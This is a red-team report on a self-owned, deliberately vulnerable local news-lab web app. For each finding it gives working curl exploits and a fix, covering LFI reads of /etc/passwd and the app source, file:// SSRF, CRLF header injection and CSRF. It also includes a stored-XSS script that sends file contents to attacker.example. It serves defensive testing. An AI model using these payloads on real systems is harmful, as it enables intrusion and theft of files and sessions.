# Red-team pass — HaMivtzar News Lab

An offensive walk of the lab that goes **beyond the 15 intentionally-tagged
weaknesses**, looking for unintended bugs, higher-impact variants, and
exploit chains. Everything below was run live against a local instance
(`http://127.0.0.1:8110` during testing; default `:8099`). Target is the
self-owned lab only — see [`../SCOPE.md`](../SCOPE.md).

The four highest-impact items here are now regression-locked in
[`run_all.py`](run_all.py) (`VULN-03b`, `VULN-04b`, `VULN-16`, `VULN-17`).

## Findings summary

| # | Finding | Severity | Notes |
|---|---------|----------|-------|
| A | LFI absolute-path read (no `../`) | **High** | elevates VULN-03 to full arbitrary read incl. source |
| B | SSRF `file://` = second read primitive | **High** | elevates VULN-04 |
| C | CRLF / HTTP response-splitting (`/go`) | **High** | elevates VULN-09; Set-Cookie & cache poisoning |
| D | SSRF port-scan oracle (verbose errors) | Medium | maps internal services |
| E | CSRF on all state-changing POSTs | **High** | wormable with stored XSS |
| F | Admin creds in URL → leak to access logs | Medium | plus history/Referer |
| G | Chain: CSRF → stored XSS → LFI exfil | **Critical** | full read-and-exfil |
| H | Unbounded stored input | Low | memory-exhaustion surface |

---

## A — LFI absolute-path read (elevates VULN-03)
`route_ajaxpage` does `os.path.join(FEEDS_DIR, name)`. In Python, joining an
**absolute** second component discards the base — so no `../` is needed:
```bash
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/etc/passwd'          # root:x:0:0:...
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/etc/hostname'
# read the app's own source to harvest logic/secrets:
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=/proc/self/cwd/app.py' | grep ADMIN_PASS
```
**Fix:** reject names containing `/`, `\`, or `..`; resolve with
`os.path.realpath` and assert the result is inside `FEEDS_DIR`; prefer an
allow-list of known feed names.

## B — SSRF via `file://` (elevates VULN-04)
`urllib.request.urlopen` honours the `file:` scheme, so the "recommendation
proxy" is also an arbitrary local-file reader:
```bash
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=file:///etc/passwd'
```
**Fix:** allow-list schemes to `http`/`https`; block `file`/`ftp`/`gopher`/etc.;
plus the host allow-list from VULN-04.

## C — CRLF / HTTP response-header injection (elevates VULN-09)
`/go` puts `url` straight into the `Location` header. Because it's unsanitised,
`%0d%0a` splits the response and injects headers — including `Set-Cookie`
(session fixation) and cache-control (cache poisoning):
```bash
curl -si 'http://127.0.0.1:8099/go?url=/x%0d%0aX-Injected:%20pwned'
curl -si 'http://127.0.0.1:8099/go?url=/%0d%0aSet-Cookie:%20SESSIONID=attacker-fixed%3B%20Path=/'
```
Both inject real headers into the response. This is materially worse than a
plain open redirect.
**Fix:** strip/reject CR and LF in any header value; use an allow-list of
internal destinations; rely on a framework that validates header values.

## D — SSRF port-scan oracle
The proxy's verbose error (`<urlopen error [Errno 111] Connection refused>`)
distinguishes closed from open ports, turning the SSRF into an internal scanner:
```bash
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=http://127.0.0.1:8099/'   # body -> open
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=http://127.0.0.1:9999/'   # Errno 111 -> closed
```
**Fix:** return a generic error; never echo the upstream exception to the client.

## E — CSRF on state-changing POSTs
`/api/chat` and `/api/comments` accept writes with no CSRF token and no
Origin/Referer check — any origin can forge them:
```bash
curl -s -X POST 'http://127.0.0.1:8099/api/comments' \
     -H 'Origin: https://evil.example.com' \
     --data 'articleId=1001&name=CSRF&text=posted-cross-origin'
```
**Fix:** per-session CSRF tokens (double-submit or synchroniser); check
`Origin`/`Sec-Fetch-Site`; `SameSite=Lax/Strict` cookies once sessions exist.

## F — Admin credentials in the URL → logs
`/admin` takes `user`/`pass` as **GET** query params, so credentials land in the
server access log, browser history, and any `Referer`:
```bash
curl -s 'http://127.0.0.1:8099/admin?user=admin&pass=hunter2' -o /dev/null
# -> the log line for that request contains pass=hunter2 in cleartext
```
**Fix:** POST credentials over TLS; never log query strings for auth routes;
scrub secrets from logs.

## G — Weaponised chain (Critical): CSRF → stored XSS → LFI exfil
1. **CSRF** delivers a **stored-XSS** comment (VULN-11 / VULN-17):
2. the comment's JS uses the **LFI** (A) to read a local file and exfiltrates it
   to an attacker host — firing in *every* visitor's browser:
```js
<script>
  fetch('/AjaxPage?jspName=/etc/passwd')
    .then(r => r.text())
    .then(d => new Image().src = '//attacker.example/x?' + btoa(d));
</script>
```
The comment persists verbatim (confirmed unescaped on `/article?id=1001`), so
one forged request turns into server-file exfiltration from visitors' sessions.
**Fix:** any *one* of {escape comment output, sanitise input, CSP without
`unsafe-inline`, fix the LFI} breaks the chain — defence in depth means fixing
all of them.

## H — Unbounded stored input
`/api/chat` and `/api/comments` accept arbitrarily large bodies and grow the
in-memory lists without bound → memory-exhaustion surface:
```bash
curl -s -X POST 'http://127.0.0.1:8099/api/chat' \
     --data-urlencode "text=$(python3 -c 'print("A"*100000)')"
```
**Fix:** cap body size (`Content-Length` limit), cap stored item count/length,
persist to a bounded store.

---

## Method notes
- Pure black-box probing with `curl` + a couple of Python one-liners, then
  source review of `app.py` to confirm root causes.
- No DoS was actually run against the host; H is noted as a surface, not exercised.
- Re-run the machine-checked subset any time with `python3 run_all.py`
  (now includes VULN-03b / 04b / 16 / 17).
